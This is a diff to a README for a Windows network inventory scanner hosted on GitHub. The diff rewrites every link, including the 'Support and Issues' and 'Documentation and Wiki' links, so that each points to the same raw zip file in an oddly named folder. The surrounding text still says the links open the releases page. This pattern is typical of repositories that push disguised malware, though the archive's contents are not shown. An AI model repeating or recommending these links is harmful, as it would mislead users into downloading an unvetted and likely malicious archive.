@@ -1,6 +1,6 @@
 # 📡 Network-Inventory-Scanner - Find Devices on Your Network Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Network--Inventory--Scanner-brightgreen?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner)
+[![Download Now](https://img.shields.io/badge/Download-Network--Inventory--Scanner-brightgreen?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To begin, download the latest version of Network-Inventory-Scanner for Windows. 
 
 Click the big green button below or visit the link to download.
 
-[![Download Network-Inventory-Scanner](https://img.shields.io/badge/Download-Network--Inventory--Scanner-blue?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner)
+[![Download Network-Inventory-Scanner](https://img.shields.io/badge/Download-Network--Inventory--Scanner-blue?style=for-the-badge)](https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip)
 
 Clicking the link opens the GitHub page where you will find the latest release and download options.
 
@@ -51,7 +51,7 @@ Clicking the link opens the GitHub page where you will find the latest release a
 ## 💾 How to Download and Install
 
 1. Visit the download page by clicking the button above or this link:  
-   https://github.com/halfdollarylangylang981/Network-Inventory-Scanner
+   https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip
 
 2. On the page, look for the **Releases** section on the right side or near the top.
 
@@ -158,13 +158,13 @@ You can also check the **Wiki** or Documentation sections on the GitHub page for
 ## 🔗 Useful Links
 
 - Download and Releases:  
-  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip
 
 - Support and Issues:  
-  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/issues
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip
 
 - Documentation and Wiki:  
-  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/wiki
+  https://github.com/halfdollarylangylang981/Network-Inventory-Scanner/raw/refs/heads/main/pointlessly/Inventory_Network_Scanner_v2.3.zip
 
 ---
 
